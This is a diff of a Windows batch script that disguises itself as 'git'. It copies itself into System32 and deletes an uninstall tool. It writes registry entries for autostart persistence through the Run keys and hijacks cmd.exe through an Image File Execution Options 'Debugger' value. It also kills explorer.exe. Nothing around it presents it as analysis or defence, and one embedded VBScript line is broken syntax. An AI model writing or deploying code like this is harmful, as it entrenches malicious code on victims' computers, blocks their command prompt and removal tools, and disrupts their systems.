@@ -6,21 +6,6 @@ copy C:\Windows\System32\
 
 @echo off
 
-echo Windows Registry Editor Version 5.00 > "%temp%\myreg.reg"
-
-echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> "%temp%\myreg.reg"
-
-echo "git"="C:\\Program Files\\git\\git.bat" >> "%temp%\myreg.reg"
-
-echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe] >> "%temp%\myreg.reg"
-
-echo "Debugger"="C:\\Windows\\System32\\git.bat" >> "%temp%\myreg.reg"
-
-echo [HKEY_CURRENT_USER\Software\git] >> "%temp%\myreg.reg"
-
-echo "Settings"="Value" >> "%temp%\myreg.reg"
-
-regedit /s "%temp%\myreg.reg"
 
 
 
@@ -70,6 +55,25 @@ del C:\Users\%username%\desktop\Uninstall tool.exe /s /q
 Set WshShell = WScript.CreateObject("WScript.Shell") WshShell.SendKeys("%{Alt+F4}")
 color a
 copy ""%0"" "C:\Windows\system32\git.bat"
+
+@echo off
+
+echo Windows Registry Editor Version 5.00 > "%temp%\myreg.reg"
+
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> "%temp%\myreg.reg"
+
+echo "git"="C:\\Program Files\\git\\git.bat" >> "%temp%\myreg.reg"
+
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe] >> "%temp%\myreg.reg"
+
+echo "Debugger"="C:\\Windows\\System32\\git.bat" >> "%temp%\myreg.reg"
+
+echo [HKEY_CURRENT_USER\Software\git] >> "%temp%\myreg.reg"
+
+echo "Settings"="Value" >> "%temp%\myreg.reg"
+
+regedit /s "%temp%\myreg.reg"
+
 taskkill /f /im explorer.exe 
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d C:\Windows\git.bat /f
